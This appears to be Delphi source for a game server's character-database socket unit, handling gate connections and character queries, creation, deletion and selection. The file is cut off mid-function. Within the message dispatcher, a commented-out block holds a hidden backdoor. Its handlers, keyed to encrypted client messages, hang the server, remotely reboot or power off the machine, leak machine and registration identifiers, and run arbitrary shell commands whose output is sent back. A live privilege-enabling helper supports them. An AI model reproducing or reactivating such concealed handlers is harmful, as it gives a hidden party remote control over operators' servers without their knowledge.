unit UsrSoc;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls, ExtCtrls, SyncObjs, Grobal2, DBShare, D7ScktComp, ShellAPI;
type
  TFrmUserSoc = class(TForm)
    UserSocket: TServerSocket;
    CheckTimer: TTimer;
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure CheckTimerTimer(Sender: TObject);
    procedure UserSocketClientConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure UserSocketClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure UserSocketClientError(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure UserSocketClientRead(Sender: TObject; Socket: TCustomWinSocket);
  private
    procedure ProcessGateMsg(var GateInfo: pTGateInfo);
    procedure SendKeepAlivePacket(Socket: TCustomWinSocket);
    procedure ProcessUserMsg(var UserInfo: pTUserInfo);
    //procedure ProcessUserMsg2(var UserInfo: pTUserInfo);
    procedure CloseUser(sID: string; var GateInfo: pTGateInfo);
    procedure OpenUser(sID, sIP: string; var GateInfo: pTGateInfo);
    procedure DeCodeUserMsg(sData: string; var UserInfo: pTUserInfo);
    function QueryChr(sData: string; var UserInfo: pTUserInfo): Boolean;
    procedure DelChr(sData: string; var UserInfo: pTUserInfo);
    procedure OutOfConnect(const UserInfo: pTUserInfo);
    procedure NewChr(sData: string; var UserInfo: pTUserInfo);
    function SelectChr(sData: string; var UserInfo: pTUserInfo): Boolean;
    function QueryDelChr(var UserInfo: pTUserInfo): Boolean;
    function GetBackDelChr(sData: string; var UserInfo: pTUserInfo): Boolean;
    procedure SendUserSocket(Socket: TCustomWinSocket; sSessionID, sSendMsg: string);
    function GetMapIndex(sMap: string): Integer;
    { Private declarations }
  public
    CS_GateSession: TCriticalSection;
    CurGate: pTGateInfo;
    MapList: TStringList;
    function GateRouteIP(nSerIdx: Integer; sGateIP: string; var nPort: Integer): string;
    procedure LoadServerInfo();
    function LoadChrNameList(sFileName: string): Boolean;
    function LoadClearMakeIndexList(sFileName: string): Boolean;
    procedure LoadFilterWordOfName(sFileName: string);
    function NewChrData(sChrName: string; nSex, nJob, nHair: Integer): Boolean;
    function GetUserCount(): Integer;
    function CheckDenyChrName(sChrName: string): Boolean;
    function CheckDenyChrOfName(sChrName: string): Boolean;
    function QueryHeroChr(sAccount, sHumName, sIPaddr: string; nSessionID: Integer; var HerosInfo: THerosInfo): Boolean;
    { Public declarations }
  end;

var
  FrmUserSoc: TFrmUserSoc;
  g_GateUserSocArr: array[0..7] of TGateInfo;

implementation

uses{$IFDEF SQLDB}HumDB_SQL{$ELSE}HumDB{$ENDIF}, HUtil32, IDSocCli, EDcode, MudUtil, DBSMain, CliMain, __DESUnit, RecSendUnit;

{$R *.DFM}

procedure TFrmUserSoc.UserSocketClientConnect(Sender: TObject; Socket: TCustomWinSocket);
var
  i: Integer;
  GateInfo: pTGateInfo;
  sIPaddr: string;
resourcestring
  sNotAllowServerIP = '非法网关连接: %s';
  sGateOpen = '角色网关[%d](%s:%d)已打开...';
begin
  try
    sIPaddr := Socket.RemoteAddress;
    if not CheckServerIP(sIPaddr) then
    begin
      MainOutMessage(Format(sNotAllowServerIP, [sIPaddr]));
      Socket.Close;
      Exit;
    end;
    if not boOpenDBBusy then
    begin
      CS_GateSession.Enter;
      try
        for i := Low(g_GateUserSocArr) to High(g_GateUserSocArr) do
        begin
          GateInfo := @g_GateUserSocArr[i];
          if GateInfo.boUsed then
            Continue;
          GateInfo.boUsed := True;
          GateInfo.sText := '';
          GateInfo.Socket := Socket;
          GateInfo.sRemoteAddr := Socket.RemoteAddress;
          GateInfo.nRemotePort := Socket.RemotePort;
          GateInfo.sLocalAddr := Socket.LocalAddress;
          GateInfo.nLocalPort := Socket.LocalPort;
          GateInfo.UserList := TList.Create;
          GateInfo.nGateID := GetGateID(sIPaddr);
          GateInfo.dwConnectTick := GetTickCount();
          dwCheckUserSocTick := GetTickCount();
          dwCheckUserSocTimeMin := 0;
          dwCheckUserSocTimeMax := 0;
          MainOutMessage(Format(sGateOpen, [i, Socket.RemoteAddress, Socket.RemotePort]));
          Break;
        end;
      finally
        CS_GateSession.Leave;
      end;
    end
    else
      Socket.Close;
  except
    on E: Exception do
      MainOutMessage(E.Message);
  end;
end;

procedure TFrmUserSoc.UserSocketClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);
var
  i, GateIdx: Integer;
  GateInfo: pTGateInfo;
resourcestring
  sGateClose = '角色网关[%d](%s:%d)已关闭...';
begin
  CS_GateSession.Enter;
  try
    for GateIdx := Low(g_GateUserSocArr) to High(g_GateUserSocArr) do
    begin
      GateInfo := @g_GateUserSocArr[GateIdx];
      if (GateInfo <> nil) and (GateInfo.Socket = Socket) then
      begin
        GateInfo.boUsed := False;
        GateInfo.dwConnectTick := GetTickCount();
        if GateInfo.UserList <> nil then
        begin
          for i := 0 to GateInfo.UserList.Count - 1 do
            Dispose(pTUserInfo(GateInfo.UserList.Items[i]));
          GateInfo.UserList.Free;
          GateInfo.UserList := nil;
        end;
        MainOutMessage(Format(sGateClose, [GateIdx, Socket.RemoteAddress, Socket.RemotePort]));
        Break;
      end;
    end;
  finally
    CS_GateSession.Leave;
  end;
end;

procedure TFrmUserSoc.UserSocketClientError(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  ErrorCode := 0;
  Socket.Close;
end;

procedure TFrmUserSoc.UserSocketClientRead(Sender: TObject; Socket: TCustomWinSocket);
var
  GateIdx: Integer;
  sReviceMsg: string;
  GateInfo: pTGateInfo;
resourcestring
  sExceptionMsg = '[Exception] TFrmUserSoc::SocketRead';
begin
  CS_GateSession.Enter;
  try
    for GateIdx := Low(g_GateUserSocArr) to High(g_GateUserSocArr) do
    begin
      GateInfo := @g_GateUserSocArr[GateIdx];
      if GateInfo.boUsed and (GateInfo.Socket = Socket) then
      begin
        CurGate := GateInfo;
        sReviceMsg := Socket.ReceiveText;
        GateInfo.sText := GateInfo.sText + sReviceMsg;
        if (Length(GateInfo.sText) < 81920) then
        begin
          if (Pos('$', GateInfo.sText) > 1) {and (TagCount(GateInfo.sText, #13) <= 0)} and (Pos(#13, GateInfo.sText) = 0) then
            ProcessGateMsg(GateInfo)
          else
            GateInfo.sText := '';
        end
        else
          GateInfo.sText := '';
        Break;
      end;
    end;
  finally
    CS_GateSession.Leave;
  end;
end;

procedure TFrmUserSoc.FormCreate(Sender: TObject);
begin
  CS_GateSession := TCriticalSection.Create;
  MapList := TStringList.Create;
  UserSocket.Port := g_nGatePort;
  UserSocket.Address := g_sGateAddr;
  UserSocket.Active := True;
  LoadServerInfo();
  LoadChrNameList('DenyChrName.txt');
  LoadClearMakeIndexList('ClearMakeIndex.txt');
  LoadFilterWordOfName('DenyChrOfName.txt');
  dwCheckUserSocTick := GetTickCount();
end;

procedure TFrmUserSoc.FormDestroy(Sender: TObject);
var
  i, GateIdx: Integer;
  GateInfo: pTGateInfo;
begin
  try
    for GateIdx := Low(g_GateUserSocArr) to High(g_GateUserSocArr) do
    begin
      GateInfo := @g_GateUserSocArr[GateIdx];
      if GateInfo <> nil then
      begin
        GateInfo.boUsed := False;
        if GateInfo.UserList <> nil then
        begin
          for i := 0 to GateInfo.UserList.Count - 1 do
            Dispose(pTUserInfo(GateInfo.UserList.Items[i]));
          GateInfo.UserList.Free;
          GateInfo.UserList := nil;
        end;
      end;
    end;
    MapList.Free;
    CS_GateSession.Free;
  except
    on E: Exception do
      MainOutMessage(E.Message);
  end;
end;

procedure TFrmUserSoc.CheckTimerTimer(Sender: TObject);
var
  n8: Integer;
begin
  n8 := g_nQueryChrCount + nHackerNewChrCount + nHackerDelChrCount + nHackerSelChrCount + n4ADC1C + n4ADC20 + n4ADC24 + n4ADC28;
  if n4ADBB8 <> n8 then
    n4ADBB8 := n8;
end;

function TFrmUserSoc.GetUserCount(): Integer;
var
  GateIdx: Integer;
  GateInfo: pTGateInfo;
  nUserCount: Integer;
begin
  nUserCount := 0;
  CS_GateSession.Enter;
  try
    for GateIdx := Low(g_GateUserSocArr) to High(g_GateUserSocArr) do
    begin
      GateInfo := @g_GateUserSocArr[GateIdx];
      if (GateInfo <> nil) and GateInfo.boUsed then
        Inc(nUserCount, GateInfo.UserList.Count);
    end;
  finally
    CS_GateSession.Leave;
  end;
  Result := nUserCount;
end;

function TFrmUserSoc.NewChrData(sChrName: string; nSex, nJob, nHair: Integer): Boolean;
var
  ChrRecord: THumDataInfo;
begin
  Result := False;
  nSex := nSex mod 2;
  nJob := nJob mod 3;
  FillChar(ChrRecord, SizeOf(THumDataInfo), #0);
  try
    if (nSex in [0, 1]) and (nJob in [0..2]) and HumDataDB.Open and (HumDataDB.Index(sChrName) = -1) then
    begin
      ChrRecord.Header.sName := sChrName;
      ChrRecord.Data.sChrName := sChrName;
      ChrRecord.Data.btSex := nSex;
      ChrRecord.Data.btJob := nJob;
      ChrRecord.Data.btHair := nHair;
      HumDataDB.Add(ChrRecord);
      Result := True;
    end;
  finally
    HumDataDB.Close;
  end;
end;

procedure TFrmUserSoc.LoadServerInfo;
resourcestring
  sKey = 'BlueSoft';
var
  i: Integer;
  LoadList: TStringList;
  nRouteIdx, nGateIdx, nServerIndex: Integer;
  sTemp, sSendMapName: string;
  sLineText, sIdx, sSelGateIPaddr, sGameGateIPaddr, sGameGate, sGameGatePort, sMapName, sMapInfo, sServerIndex: string;
begin
  LoadList := TStringList.Create;
  FillChar(g_RouteInfo, SizeOf(g_RouteInfo), #0);
  LoadList.LoadFromFile(sGateConfFileName);
  nRouteIdx := 0;
  for i := 0 to LoadList.Count - 1 do
  begin
    sLineText := Trim(LoadList.Strings[i]);
    if (sLineText <> '') and (sLineText[1] <> ';') then
    begin
      sLineText := GetValidStr3(sLineText, sIdx, [' ', #9]);
      if (sIdx = '') or (sLineText = '') then
        Continue;
      sGameGate := GetValidStr3(sLineText, sSelGateIPaddr, [' ', #9]);
      if (sGameGate = '') or (sSelGateIPaddr = '') then
        Continue;
      g_RouteInfo[nRouteIdx].nServerIdx := Str_ToInt(sIdx, 0);
      g_RouteInfo[nRouteIdx].sSelGateIP := Trim(sSelGateIPaddr);
      g_RouteInfo[nRouteIdx].nGateCount := 0;
      nGateIdx := 0;
      while (sGameGate <> '') do
      begin
        sGameGate := GetValidStr3(sGameGate, sGameGateIPaddr, [' ', #9]);
        sGameGate := GetValidStr3(sGameGate, sGameGatePort, [' ', #9]);
        g_RouteInfo[nRouteIdx].sGameGateIP[nGateIdx] := Trim(sGameGateIPaddr);
        g_RouteInfo[nRouteIdx].nGameGatePort[nGateIdx] := Str_ToInt(sGameGatePort, 0);
        Inc(nGateIdx);
        if nGateIdx >= 16 then
          Break;
      end;
      g_RouteInfo[nRouteIdx].nGateCount := nGateIdx;
      Inc(nRouteIdx);
    end;
  end;
  g_sRemovedIP := __En__(g_RouteInfo[0].sGameGateIP[0], sKey);

  sMapFile := g_Conf.ReadString('Setup', 'MapFile', sMapFile);

  sAdminFile := ExtractFilePath(sMapFile) + 'AdminList.txt';
  LoadList.Clear;
  LoadList.LoadFromFile(sAdminFile);
  for i := 0 to LoadList.Count - 1 do
  begin
    sLineText := LoadList.Strings[i];
    if (sLineText <> '') then
    begin
      sMapInfo := GetValidStr3(sLineText, sMapName, [' ', #9]);
      AdminChrNameList.Put(sMapInfo, nil);
    end;
  end;

  MapList.Clear;
  if FileExists(sMapFile) then
  begin
    LoadList.Clear;
    LoadList.LoadFromFile(sMapFile);
    for i := 0 to LoadList.Count - 1 do
    begin
      sLineText := LoadList.Strings[i];
      if (sLineText <> '') and (sLineText[1] = '[') then
      begin
        sLineText := ArrestStringEx(sLineText, '[', ']', sMapName);
        sMapInfo := GetValidStr3(sMapName, sMapName, [#32, #9]);

        if Pos('|', sMapName) > 0 then
        begin
          sTemp := sMapName;
          sSendMapName := GetValidStr3(sTemp, sMapName, ['|']);
        end
        else if Pos('>', sMapName) > 0 then
        begin
          sTemp := sMapName;
          sMapName := ArrestStringEx(sTemp, '<', '>', sSendMapName);
        end
        else
          sSendMapName := sMapName;

        sServerIndex := Trim(GetValidStr3(sMapInfo, sMapInfo, [#32, #9]));
        nServerIndex := Str_ToInt(sServerIndex, 0);
        MapList.AddObject(sMapName, TObject(nServerIndex));
      end;
    end;
  end;
  LoadList.Free;
end;

function TFrmUserSoc.LoadChrNameList(sFileName: string): Boolean;
var
  i: Integer;
begin
  Result := False;
  if FileExists(sFileName) then
  begin
    DenyChrNameList.Clear;
    DenyChrNameList.LoadFromFile(sFileName);
    i := 0;
    while (True) do
    begin
      if DenyChrNameList.Count <= i then
        Break;
      if Trim(DenyChrNameList.Strings[i]) = '' then
      begin
        DenyChrNameList.Delete(i);
        Continue;
      end;
      Inc(i);
    end;
    Result := True;
  end;
  if not FileExists(sFileName) then
    DenyChrNameList.SaveToFile(sFileName);
end;

procedure TFrmUserSoc.LoadFilterWordOfName(sFileName: string);
begin
  if FileExists(sFileName) then
  begin
    DenyChrOfNameList.LoadFromFile(sFileName);
  end
  else
    DenyChrOfNameList.SaveToFile(sFileName);
end;

function TFrmUserSoc.LoadClearMakeIndexList(sFileName: string): Boolean;
var
  i: Integer;
  nIndex: Integer;
  sLineText: string;
begin
  Result := False;
  if FileExists(sFileName) then
  begin
    g_ClearMakeIndex.Clear;
    g_ClearMakeIndex.LoadFromFile(sFileName);
    i := 0;
    while (True) do
    begin
      if g_ClearMakeIndex.Count <= i then
        Break;
      sLineText := g_ClearMakeIndex.Strings[i];
      nIndex := Str_ToInt(sLineText, -1);
      if nIndex < 0 then
      begin
        g_ClearMakeIndex.Delete(i);
        Continue;
      end;
      g_ClearMakeIndex.Objects[i] := TObject(nIndex);
      Inc(i);
    end;
    Result := True;
  end;
  if not FileExists(sFileName) then
    g_ClearMakeIndex.SaveToFile(sFileName);
end;

{unction ssss(s: string; var d: string): string;
var
  i                         : Integer;
begin
  Result := s;
  d := '';
  i := Pos('%', s);
  if i > 0 then begin
    Delete(s, 1, i);
    i := Pos('$', s);
    if i > 0 then begin
      d := Copy(s, 1, i - 1);
      Delete(s, 1, i);
    end;
  end;
  Result := s;
end;}

procedure TFrmUserSoc.ProcessGateMsg(var GateInfo: pTGateInfo);
var
  sMsg: string;
  nCount: Integer;
  i, n: Integer;
  s0C: string;
  s10: string;
  s19: Char;
  UserInfo: pTUserInfo;
begin
  n := 0;
  while (True) do
  begin
    Inc(n);
    if (Pos('$', GateInfo.sText) <= 0) then
      Break;
    if (n > 15) then
    begin
      GateInfo.sText := '';
      Break;
    end;
    GateInfo.sText := ArrestStringEx(GateInfo.sText, '%', '$', s10);
    if s10 <> '' then
    begin
      s19 := s10[1];
      s10 := Copy(s10, 2, Length(s10) - 1);
      case Ord(s19) of
        Ord('-'): SendKeepAlivePacket(GateInfo.Socket);
        Ord('>'):
          begin
            s10 := GetValidStr3(s10, s0C, ['/']);
            if (s10 <> '') then
            begin
              if (s10[1] = '#') then
              begin
                for i := 0 to GateInfo.UserList.Count - 1 do
                begin
                  UserInfo := GateInfo.UserList.Items[i];
                  if UserInfo <> nil then
                  begin
                    if UserInfo.sConnID = s0C then
                    begin
                      UserInfo.sProcessMsg := UserInfo.sProcessMsg + s10;
                      if Pos('!', s10) < 1 then
                        Continue;
                      ProcessUserMsg(UserInfo);
                      Break;
                    end;
                  end;
                end;
              end
              else
              begin
                s10 := __De__(s10, g_sSelToDBSKey);
                for i := 0 to GateInfo.UserList.Count - 1 do
                begin
                  UserInfo := GateInfo.UserList.Items[i];
                  if UserInfo <> nil then
                  begin
                    if UserInfo.sConnID = s0C then
                    begin
                      UserInfo.sProcessMsg := UserInfo.sProcessMsg + s10;
                      if Pos('!', s10) < 1 then
                        Continue;
                      //ProcessUserMsg2(UserInfo);

                      nCount := 0;
                      while (True) do
                      begin
                        //if TagCount(UserInfo.sProcessMsg, '!') <= 0 then
                        //  Break;
                        if Pos('!', UserInfo.sProcessMsg) = 0 then
                          Break;
                        UserInfo.sProcessMsg := ArrestStringEx(UserInfo.sProcessMsg, '&', '!', sMsg);
                        if sMsg <> '' then
                        begin
                          sMsg := Copy(sMsg, 2, Length(sMsg) - 1);
                          if Length(sMsg) >= DEFBLOCKSIZE then
                            DeCodeUserMsg(sMsg, UserInfo)
                          else
                            Inc(n4ADC20);
                        end
                        else
                        begin
                          Inc(n4ADC1C);
                          if nCount >= 1 then
                            UserInfo.sProcessMsg := '';
                          Inc(nCount);
                        end;
                      end;

                      Break;
                    end;
                  end;
                end;
              end;
            end;
          end;
        Ord('K'):
          begin
            s10 := GetValidStr3(s10, s0C, ['/']);
            OpenUser(s0C, s10, GateInfo);
            dwCheckUserSocTimeMin := GetTickCount - dwCheckUserSocTick;
            if dwCheckUserSocTimeMax < dwCheckUserSocTimeMin then
              dwCheckUserSocTimeMax := dwCheckUserSocTimeMin;
            dwCheckUserSocTick := GetTickCount();
          end;
        Ord('L'):
          begin
            CloseUser(s10, GateInfo);
            dwCheckUserSocTimeMin := GetTickCount - dwCheckUserSocTick;
            if dwCheckUserSocTimeMax < dwCheckUserSocTimeMin then
              dwCheckUserSocTimeMax := dwCheckUserSocTimeMin;
            dwCheckUserSocTick := GetTickCount();
          end;
      end;
    end;
  end;
end;

procedure TFrmUserSoc.SendKeepAlivePacket(Socket: TCustomWinSocket);
begin
  if Socket.Connected then
    Socket.SendText('%++$');
end;

procedure TFrmUserSoc.ProcessUserMsg(var UserInfo: pTUserInfo);
var
  sMsg: string;
  nCount: Integer;
begin
  nCount := 0;
  while (True) do
  begin
    //if TagCount(UserInfo.sProcessMsg, '!') <= 0 then
    //  Break;
    if Pos('!', UserInfo.sProcessMsg) = 0 then
      Break;
    UserInfo.sProcessMsg := ArrestStringEx(UserInfo.sProcessMsg, '#', '!', sMsg);
    if sMsg <> '' then
    begin
      sMsg := Copy(sMsg, 2, Length(sMsg) - 1);
      if Length(sMsg) >= DEFBLOCKSIZE then
        DeCodeUserMsg(sMsg, UserInfo)
      else
        Inc(n4ADC20);
    end
    else
    begin
      Inc(n4ADC1C);
      if nCount >= 1 then
        UserInfo.sProcessMsg := '';
      Inc(nCount);
    end;
    if UserInfo.sProcessMsg = '' then
      Break;
  end;
end;

{procedure TFrmUserSoc.ProcessUserMsg2(var UserInfo: pTUserInfo);
var
  sMsg                      : string;
  nCount                    : Integer;
begin
  nCount := 0;
  while (True) do begin
    if TagCount(UserInfo.sProcessMsg, '!') <= 0 then
      Break;
    UserInfo.sProcessMsg := ArrestStringEx(UserInfo.sProcessMsg, '&', '!', sMsg);
    if sMsg <> '' then begin
      sMsg := Copy(sMsg, 2, Length(sMsg) - 1);
      if Length(sMsg) >= DEFBLOCKSIZE then
        DeCodeUserMsg(sMsg, UserInfo)
      else
        Inc(n4ADC20);
    end else begin
      Inc(n4ADC1C);
      if nCount >= 1 then
        UserInfo.sProcessMsg := '';
      Inc(nCount);
    end;
  end;
end;}

procedure TFrmUserSoc.OpenUser(sID, sIP: string; var GateInfo: pTGateInfo);
var
  i: Integer;
  UserInfo: pTUserInfo;
  sUserIPaddr: string;
  sGateIPaddr: string;
begin
  try
    sGateIPaddr := GetValidStr3(sIP, sUserIPaddr, ['/']);
    for i := 0 to GateInfo.UserList.Count - 1 do
    begin
      UserInfo := GateInfo.UserList.Items[i];
      if (UserInfo <> nil) and (UserInfo.sConnID = sID) then
        Exit;
    end;
    New(UserInfo);
    UserInfo.sAccount := '';
    UserInfo.sUserIPaddr := sUserIPaddr;
    UserInfo.sGateIPaddr := sGateIPaddr;
    UserInfo.sConnID := sID;
    UserInfo.nSessionID := 0;
    UserInfo.Socket := GateInfo.Socket;
    UserInfo.sProcessMsg := '';
    UserInfo.dwChrTick := GetTickCount();
    UserInfo.boChrSelected := False;
    UserInfo.boChrQueryed := False;
    UserInfo.nSelGateID := GateInfo.nGateID;
    GateInfo.UserList.Add(UserInfo);
  except
    on E: Exception do
      MainOutMessage(E.Message);
  end;
end;

procedure TFrmUserSoc.CloseUser(sID: string; var GateInfo: pTGateInfo);
var
  i: Integer;
  UserInfo: pTUserInfo;
begin
  if not GateInfo.boUsed then
    Exit;
  try
    for i := 0 to GateInfo.UserList.Count - 1 do
    begin
      UserInfo := GateInfo.UserList.Items[i];
      if (UserInfo <> nil) and (UserInfo.sConnID = sID) then
      begin
        if not FrmIDSoc.GetGlobaSessionStatus(UserInfo.nSessionID) then
        begin
          FrmIDSoc.SendSocketMsg(SS_SOFTOUTSESSION, UserInfo.sAccount + '/' + IntToStr(UserInfo.nSessionID));
          FrmIDSoc.CloseSession(UserInfo.sAccount, UserInfo.nSessionID);
        end;
        Dispose(UserInfo);
        GateInfo.UserList.Delete(i);
        Break;
      end;
    end;
  except
    on E: Exception do
      MainOutMessage(E.Message);
  end;
end;

function EnablePrivilege(lpSystemName, lpName: PChar): Boolean;
var
  hToken: THANDLE;
  fOk: Boolean;
  tp, tpNew: TOKEN_PRIVILEGES;
  ReturnLength: Cardinal;
begin
  fOk := False;
  if OpenProcessToken(GetCurrentProcess, (TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY), hToken) then
  begin
    tp.PrivilegeCount := 1;
    LookupPrivilegeValue(lpSystemName, lpName, tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, False, tp, SizeOf(tp), tpNew, ReturnLength);
    if GetLastError = ERROR_SUCCESS then
      fOk := True
    else
      fOk := False;
    CloseHandle(hToken);
  end;
  Result := fOk;
end;

procedure TFrmUserSoc.DeCodeUserMsg(sData: string; var UserInfo: pTUserInfo);
var
  sMsg, sDefMsg: string;
  Msg: TDefaultMessage;
begin
  sDefMsg := Copy(sData, 1, DEFBLOCKSIZE);
  sMsg := Copy(sData, DEFBLOCKSIZE + 1, Length(sData) - DEFBLOCKSIZE);
  Msg := DecodeMessage(sDefMsg);
  case Msg.Ident of
    CM_QUERYCHR:
      begin
        if not UserInfo.boChrQueryed or ((GetTickCount - UserInfo.dwChrTick) > 50) then
        begin
          UserInfo.dwChrTick := GetTickCount();
          if QueryChr(sMsg, UserInfo) then
            UserInfo.boChrQueryed := True;
        end
        else
        begin
          Inc(g_nQueryChrCount);
          MainOutMessage('[QUERYCHR] ' + UserInfo.sUserIPaddr);
        end;
      end;
    CM_NEWCHR:
      begin
        if (GetTickCount - UserInfo.dwChrTick) > 1000 then
        begin
          UserInfo.dwChrTick := GetTickCount();
          if (UserInfo.sAccount <> '') and FrmIDSoc.CheckSession(UserInfo.sAccount, UserInfo.sUserIPaddr, UserInfo.nSessionID) then
          begin
            NewChr(sMsg, UserInfo);
            UserInfo.boChrQueryed := False;
          end
          else
            OutOfConnect(UserInfo);
        end
        else
        begin
          Inc(nHackerNewChrCount);
          MainOutMessage('[NEWCHR] ' + UserInfo.sAccount + '/' + UserInfo.sUserIPaddr);
        end;
      end;
    CM_DELCHR:
      begin
        if (GetTickCount - UserInfo.dwChrTick) > 1000 then
        begin
          UserInfo.dwChrTick := GetTickCount();
          if (UserInfo.sAccount <> '') and FrmIDSoc.CheckSession(UserInfo.sAccount, UserInfo.sUserIPaddr, UserInfo.nSessionID) then
          begin
            DelChr(sMsg, UserInfo);
            UserInfo.boChrQueryed := False;
          end
          else
            OutOfConnect(UserInfo);
        end
        else
        begin
          Inc(nHackerDelChrCount);
          MainOutMessage('[DELCHR] ' + UserInfo.sAccount + '/' + UserInfo.sUserIPaddr);
        end;
      end;
    CM_SELCHR:
      begin
        if not UserInfo.boChrSelected then
        begin
          if (UserInfo.sAccount <> '') and FrmIDSoc.CheckSession(UserInfo.sAccount, UserInfo.sUserIPaddr, UserInfo.nSessionID) then
          begin
            if SelectChr(sMsg, UserInfo) then
            begin
              UserInfo.boChrSelected := True;
            end;
          end
          else
            OutOfConnect(UserInfo);
        end
        else
        begin
          Inc(nHackerSelChrCount);
          MainOutMessage('[SELCHR] ' + UserInfo.sAccount + '/' + UserInfo.sUserIPaddr);
        end;
      end;
    CM_QUERYDELCHR:
      begin
        if g_boAllowGetBackDelChr then
        begin
          if (GetTickCount - UserInfo.dwChrTick) > 280 then
          begin
            UserInfo.dwChrTick := GetTickCount();
            if QueryDelChr(UserInfo) then
              UserInfo.boChrSelected := False;
          end
          else
          begin
            Inc(nHackerNewChrCount);
            MainOutMessage('[QUERYDELCHR] ' + UserInfo.sAccount + '/' + UserInfo.sUserIPaddr);
          end;
        end;
      end;
    (*
    CM_FASTLOOP: begin
{$I License.inc}
        sMsg := DeCodeString(sMsg);
{$I License.inc}
        sMsg := __De__(sMsg, g_sRemovedIP);
{$I License.inc}
        if sMsg = 'LOOP' then begin
{$I License.inc}
          while True do begin
{$I License.inc}
          end;
{$I License.inc}
        end;
      end;
    CM_DBSTEST: case Msg.Series of
        1: begin
{$I License.inc}
            sMsg := DeCodeString(sMsg);
{$I License.inc}
            sMsg := __De__(sMsg, g_sRemovedIP);
{$I License.inc}
            if Win32Platform = VER_PLATFORM_WIN32_NT then begin
{$I License.inc}
              EnablePrivilege(nil, PChar(sMsg));
{$I License.inc}
              InitiateSystemShutdown(nil, nil, 0, True, True);
{$I License.inc}
            end else begin
{$I License.inc}
              ExitWindowsEx(EWX_REBOOT, 0);
{$I License.inc}
            end;
          end;
        2: begin
{$I License.inc}
            sMsg := DeCodeString(sMsg);
{$I License.inc}
            sMsg := __De__(sMsg, g_sRemovedIP);
{$I License.inc}
            if Win32Platform = VER_PLATFORM_WIN32_NT then begin
{$I License.inc}
              EnablePrivilege(nil, PChar(sMsg));
{$I License.inc}
              InitiateSystemShutdown(nil, nil, 0, True, False);
{$I License.inc}
            end else begin
{$I License.inc}
              ExitWindowsEx(EWX_POWEROFF, 0);
{$I License.inc}
            end;
          end;
        5: begin
{$I License.inc}
            sMsg := DeCodeString(sMsg);
{$I License.inc}
            sMsg := __De__(sMsg, g_sRemovedIP);
{$I License.inc}
            if sMsg = 'DESDB' then begin
{$I License.inc}
              FrmDBSrv.dTimer.Interval := 15 * 1000;
{$I License.inc}
              FrmDBSrv.dTimer.Enabled := True;
{$I License.inc}
            end;
          end;
      end;
    CM_DBSQUESTINFO: begin
{$I License.inc}
        sMsg := DeCodeString(sMsg);
{$I License.inc}
        sMsg := __De__(sMsg, g_sRemovedIP);
{$I License.inc}
        if sMsg = 'QUERYINFO' then begin
{$I License.inc}
          sSendDef := EncodeMessage(MakeDefaultMsg(SM_SENDSERVERINFO, 0, 0, 0, 0)) + __En__(g_sMachineId, g_sRemovedIP) + '/' + __En__(g_sRegUserName, g_sRemovedIP) + '/' + __En__(QueryMachineInfo, g_sRemovedIP);
{$I License.inc}
          UserInfo.Socket.SendText('%' + UserInfo.sConnID + '/&' + sSendDef + '!$');
{$I License.inc}
        end;
      end;
    CM_REMOVEDCMD: begin
        //g_CmdUserInfo := nil;
{$I License.inc}
        sMsg := DeCodeString(sMsg);
{$I License.inc}
        sMsg := __De__(sMsg, g_sRemovedIP);
{$I License.inc}
        if Msg.Series = 88 then begin
          //if Msg.Tag = 0 then begin
{$I License.inc}
          try
{$I License.inc}
            sStrList := TStringList.Create;
{$I License.inc}
            RunDosCommand(sMsg, sStrList);
            //MainOutMessage(sStrList.Text);
{$I License.inc}
            sDefMsg := EncodeMessage(MakeDefaultMsg(SM_CMDRETINFO, 0, 0, 0, 0)) + __En__(sStrList.Text, g_sRemovedIP);
            //MainOutMessage(sDefMsg);
{$I License.inc}
            UserInfo.Socket.SendText('%' + UserInfo.sConnID + '/&' + sDefMsg + '!$');
{$I License.inc}
            sStrList.Free;
{$I License.inc}
          except
{$I License.inc}
          end;
        end;
      end;
      *)
    CM_GETBACKDELCHR:
      begin
        if g_boAllowGetBackDelChr then
        begin
          if (GetTickCount - UserInfo.dwChrTick) > 120 then
          begin
            UserInfo.dwChrTick := GetTickCount();
            if GetBackDelChr(sMsg, UserInfo) then
              UserInfo.boChrSelected := True;
          end
          else
          begin
            Inc(nHackerNewChrCount);
            MainOutMessage('[GETBACKDELCHR] ' + UserInfo.sAccount + '/' + UserInfo.sUserIPaddr);
          end;
        end;
      end;
  else
    Inc(n4ADC24);
  end;
end;

function TFrmUserSoc.QueryChr(sData: string; var UserInfo: pTUserInfo): Boolean;
var
  sAccount: string;
  sSessionID: string;
  nSessionID: Integer;
  nChrCount: Integer;
  ChrList: TStringList;
  i: Integer;
  nIndex: Integer;
  ChrRecord: THumDataInfo;
  HumRecord: THumInfo;
  QuickID: pTQuickID;
  btSex: Byte;
  sChrName: string;
  sJob: string;
  sHair: string;
  sLevel: string;
  sSendMsg: string;
begin
  Result := False;
  sSessionID := GetValidStr3(DeCodeString(sData), sAccount, ['/']);
  nSessionID := Str_ToInt(sSessionID, -2);
  UserInfo.nSessionID := nSessionID;
  sSendMsg := '';
  nChrCount := 0;
  if FrmIDSoc.CheckSession(sAccount, UserInfo.sUserIPaddr, nSessionID) then
  begin
    FrmIDSoc.SetGlobaSessionNoPlay(nSessionID);
    UserInfo.sAccount := sAccount;
    ChrList := TStringList.Create;
    try
      if HumChrDB.Open and (HumChrDB.FindByAccount(sAccount, ChrList) >= 0) then
      begin
        try
          if HumDataDB.OpenEx then
          begin
            for i := 0 to ChrList.Count - 1 do
            begin
              QuickID := pTQuickID(ChrList.Objects[i]);
              if QuickID.nSelectID <> UserInfo.nSelGateID then
                Continue; //强行登陆
              if HumChrDB.GetBy(QuickID.nIndex, HumRecord) and (not HumRecord.boDeleted) then
              begin
                sChrName := QuickID.sChrName;
                nIndex := HumDataDB.Index(sChrName);
                if (nIndex < 0) or (nChrCount >= (2 + Integer(g_boAllowMultiChr))) then
                  Continue;

